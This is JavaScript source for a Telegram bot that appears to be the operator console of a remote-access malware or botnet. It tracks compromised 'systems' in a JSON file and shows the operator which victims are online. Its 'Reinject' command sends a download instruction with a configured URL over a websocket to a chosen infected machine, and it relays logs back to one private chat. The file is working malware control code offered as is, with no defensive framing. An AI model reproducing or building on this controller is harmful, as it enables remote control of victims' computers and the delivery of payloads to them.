const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const path = require("path");

const config = require("./config.json");
const { clients } = require("./server.js");

const TOKEN = config.botToken;
const ALLOWED_CHAT_ID = config.allowedChatId;

const bot = new TelegramBot(TOKEN, { polling: true });
const systemsFile = path.join(__dirname, "./systems.json");

function loadSystems() {
  return fs.existsSync(systemsFile)
    ? JSON.parse(fs.readFileSync(systemsFile))
    : {};
}

function getActiveUsers(systemsData) {
  return Object.keys(systemsData).filter((username) => systemsData[username].active);
}

bot.onText(/\/start/, (msg) => {
  if (msg.chat.id !== ALLOWED_CHAT_ID) return;

  const systemsData = loadSystems();
  const total = Object.keys(systemsData).length;
  const online = getActiveUsers(systemsData).length;

  bot.sendMessage(msg.chat.id, `\n💾 Total Systems: ${total}\n\n✅ Systems Active: ${online}`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: "🔍 Show Active Systems", callback_data: "show_active" }],
        [{ text: "🔁 Reinject", callback_data: "reinject" }]
      ]
    }
  });
});

bot.on("callback_query", (query) => {
  const chatId = query.message.chat.id;
  if (chatId !== ALLOWED_CHAT_ID) return;

  const data = query.data;
  const systemsData = loadSystems();

  if (data === "show_active") {
    const activeUsers = getActiveUsers(systemsData);
    const msg = activeUsers.length > 0 ? activeUsers.join("\n") : "No active systems.";
    bot.sendMessage(chatId, `🟢 Active Systems:\n${msg}`);
  }

  if (data === "reinject") {
    const activeUsers = getActiveUsers(systemsData);
    if (activeUsers.length === 0) {
      return bot.sendMessage(chatId, "No active systems available.");
    }

    const buttons = activeUsers.map((u) => [{ text: u, callback_data: `inject_${u}` }]);
    bot.sendMessage(chatId, "Select a system to reinject:", {
      reply_markup: { inline_keyboard: buttons }
    });
  }

  if (data.startsWith("inject_")) {
    const username = data.replace("inject_", "");
    const ws = clients[username];

    if (ws && ws.readyState === 1) {
      ws.send(`download:${config.downloadUrl}`);
      bot.sendMessage(chatId, `✅ remote command sent to ${username}`);
    } else {
      bot.sendMessage(chatId, `⚠️ ${username} is not currently connected.`);
    }
  }

  bot.answerCallbackQuery(query.id);
});

bot.on("message", (msg) => {
  console.log("Chat ID:", msg.chat.id, "Type:", msg.chat.type);
});

function notifyLOG(logMessage){
bot.sendMessage(ALLOWED_CHAT_ID, logMessage, { parse_mode: "Markdown" });
}

module.exports = { notifyLOG };